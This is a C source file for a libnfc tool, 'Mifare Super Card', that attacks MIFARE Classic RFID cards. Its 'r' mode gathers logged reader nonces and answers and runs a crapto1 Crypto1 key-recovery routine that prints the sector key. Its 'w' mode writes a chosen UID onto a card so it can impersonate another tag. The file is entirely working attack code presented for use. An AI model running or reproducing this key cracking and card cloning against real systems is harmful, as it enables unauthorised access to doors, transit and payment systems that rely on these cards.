#ifdef HAVE_CONFIG_H
#  include "config.h"
#endif // HAVE_CONFIG_H

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <string.h>
#include <ctype.h>
#include "crapto1.h"

#include <nfc/nfc.h>

#include "mifare.h"
#include "nfc-utils.h"

#define __STDC_FORMAT_MACROS
#include <inttypes.h>
#define llx PRIx64

static nfc_context *context;
static nfc_device *pnd;
static nfc_target nt;
uint8_t uid[4]={0x0};
uint8_t nr_0[4]={0x0};
uint8_t ar_0[4]={0x0};
uint8_t nr_1[4]={0x0};
uint8_t ar_1[4]={0x0};

static const nfc_modulation nmMifare = {
  .nmt = NMT_ISO14443A,
  .nbr = NBR_106,
};

#define MAX_FRAME_LEN 264

static uint8_t abtRx[MAX_FRAME_LEN];
static int szRxBits;

uint64_t bytes_to_num(uint8_t* src,size_t len)
{
  uint64_t num=0;
  while(len--)
  {
    num=(num <<8)|(*src);
    src++;
  }
  return num;
}

void prepare_card(nfc_device *pnd, uint8_t *uid)
{
  uint8_t abtTx[]={0x0a,0x00,0x00,0xae,0x01,0x02,0x05,0x00,0x00,0x00,0x00,0x00}; 
  uint8_t bbtTx[]={0x0b,0x00,0x00,0xae,0x01,0x03,0x01,0x00};
  memcpy(abtTx+7,uid,4);
  if((szRxBits=nfc_initiator_transceive_bytes(pnd,abtTx,sizeof(abtTx),abtRx,sizeof(abtRx),0))<20)
  {
   //do something 
  }
  if((szRxBits=nfc_initiator_transceive_bytes(pnd,bbtTx,sizeof(bbtTx),abtRx,sizeof(abtRx),0))<20)
  {
   //do something 
  }
  
}

void read_zero(nfc_device *pnd, uint8_t *uid)
{
  uint8_t abtTx[]={0x0a,0x00,0x00,0xae,0x00,0x02,0x00}; 
  
  if ((szRxBits=nfc_initiator_transceive_bytes(pnd,abtTx,sizeof(abtTx),abtRx,sizeof(abtRx),0))<42)
  {
    memcpy(uid,abtRx+2,4);
  }
}

void read_one(nfc_device *pnd,int key, uint8_t *nr_0, uint8_t *ar_0)
{
  uint8_t abtTx[]={0x0b,0x00,0x00,0xae,0x00,0x00,0x00};
  if(key){
    abtTx[0]=0x0a;
  }
  
  if ((szRxBits=nfc_initiator_transceive_bytes(pnd,abtTx,sizeof(abtTx),abtRx,sizeof(abtRx),0))<42)
  {
    memcpy(nr_0,abtRx+4,4);
    memcpy(ar_0,abtRx+8,4);
  }
}

void read_two(nfc_device *pnd,int key, uint8_t *nr_1, uint8_t *ar_1)
{
  uint8_t abtTx[]={0x0b,0x00,0x00,0xae,0x00,0x01,0x00};
  if(key){
    abtTx[0]=0x0a;
  }
  
  if ((szRxBits=nfc_initiator_transceive_bytes(pnd,abtTx,sizeof(abtTx),abtRx,sizeof(abtRx),0))<42)
  {
    memcpy(nr_1,abtRx+4,4);
    memcpy(ar_1,abtRx+8,4);
  }  
}

int crack(uint32_t uid,uint32_t nt,uint32_t nr0_enc,uint32_t ar0_enc,uint32_t nr1_enc,uint32_t ar1_enc)
{
  uint64_t key;
  struct Crypto1State *s,*t;

  s = lfsr_recovery32(ar0_enc ^ prng_successor(nt, 64), 0);
  
  for(t = s; t->odd | t->even; ++t) {
    lfsr_rollback_word(t, 0, 0);
    lfsr_rollback_word(t, nr0_enc, 1);
    lfsr_rollback_word(t, uid ^ nt, 0);
    crypto1_get_lfsr(t, &key);
    crypto1_word(t, uid ^ nt, 0);
    crypto1_word(t, nr1_enc, 1);
    if (ar1_enc == (crypto1_word(t, 0, 0) ^ prng_successor(nt, 64))) {
      printf("\nFound Key: [%012"llx"]\n\n",key);
			return 0;
    }
  }
  printf("Key Not Found!");
  return 1;
}

static int get_rats(void)
{
  int res;
  uint8_t  abtRats[2] = { 0xe0, 0x50};
  // Use raw send/receive methods
  if (nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, false) < 0) {
    nfc_perror(pnd, "nfc_configure");
    return -1;
  }
  res = nfc_initiator_transceive_bytes(pnd, abtRats, sizeof(abtRats), abtRx, sizeof(abtRx), 0);
  return res;
}

void usage()
{
  printf("\nUsage: ./nfc-super  [h] [r] [w xxxxxxxx]\n"); 
  printf("\t h - this help message\n"); 
  printf("\t r - recover key\n"); 
  printf("\t w xxxxxxxx - prepare card with UID 8-hex chars\n"); 
}

int init()
{
   //uint8_t *pbtUID;
  printf("Mifare Super Card v0.1 (C)2014 Andy\n\n"); 
  
  nfc_init(&context);
  if (context == NULL) {
    ERR("Unable to init libnfc (malloc)");
    exit(EXIT_FAILURE);
  }

// Try to open the NFC reader
  pnd = nfc_open(context, NULL);
  if (pnd == NULL) {
    ERR("Error opening NFC reader");
    nfc_exit(context);
    exit(EXIT_FAILURE);
  }

  if (nfc_initiator_init(pnd) < 0) {
    nfc_perror(pnd, "nfc_initiator_init");
    nfc_close(pnd);
    nfc_exit(context);
    exit(EXIT_FAILURE);
  };

// Let the reader only try once to find a tag
  if (nfc_device_set_property_bool(pnd, NP_INFINITE_SELECT, false) < 0) {
    nfc_perror(pnd, "nfc_device_set_property_bool");
    nfc_close(pnd);
    nfc_exit(context);
    exit(EXIT_FAILURE);
  }
// Disable ISO14443-4 switching in order to read devices that emulate Mifare Classic with ISO14443-4 compliance.
  if (nfc_device_set_property_bool(pnd, NP_AUTO_ISO14443_4, false) < 0) {
    nfc_perror(pnd, "nfc_device_set_property_bool");
    nfc_close(pnd);
    nfc_exit(context);
    exit(EXIT_FAILURE);
  }

  //printf("NFC reader: %s opened\n", nfc_device_get_name(pnd));

// Try to find a MIFARE Classic tag
  if (nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt) <= 0) {
    printf("Error: no tag was found\n");
    usage();
    nfc_close(pnd);
    nfc_exit(context);
    exit(EXIT_FAILURE);
  }
// Test if we are dealing with a MIFARE compatible tag
  if ((nt.nti.nai.btSak & 0x08) == 0) {
    printf("Warning: tag is probably not a MFC!\n");
  }

// Get the info from the current tag
  //pbtUID = nt.nti.nai.abtUid;
  print_nfc_target(&nt, false);
  
  get_rats();   
}

int main(int argc, const char *argv[])
{
  if(argc<=1)
  {
    usage();
    exit(0);               
  }
  
  //do stuff 
  if ((strcmp(argv[1],"r")==0)||(strcmp(argv[1],"-r")==0))
  {
    init();
    read_zero(pnd,uid);
    read_one(pnd,0,nr_0,ar_0);
    read_zero(pnd,uid);
    read_two(pnd,0,nr_1,ar_1);
  
    printf(" UID: ");
    print_hex(uid,4);
    printf("1:NR: ");
    print_hex(nr_0,4);
    printf("1:AR: ");
    print_hex(ar_0,4);
    printf("2:NR: ");
    print_hex(nr_1,4);
    printf("2:AR: ");
    print_hex(ar_1,4);
    printf("Cracking...");
    crack(bytes_to_num(uid,4),\
	0,\
	bytes_to_num(nr_0,4),\
	bytes_to_num(ar_0,4),\
	bytes_to_num(nr_1,4),\
	bytes_to_num(ar_1,4));
  }
  
  if ((strcmp(argv[1],"w")==0)||(strcmp(argv[1],"-w")==0))
  {
    init();
    uint8_t uid_sel[4]={0x11,0x22,0x33,0x44};
    char *pos = argv[2];
    while( *pos )
    {
      if( !((pos-argv[2])&1) )
       sscanf(pos,"%02x",&uid_sel[(pos-argv[2])>>1]);
      ++pos;
    }
    prepare_card(pnd,uid_sel); 
  }
  
  if ((strcmp(argv[1],"h")==0)||(strcmp(argv[1],"-h")==0))
  {
   usage();
   exit(0);
  }
  
  nfc_close(pnd);
  nfc_exit(context);
  exit(EXIT_SUCCESS);  
}
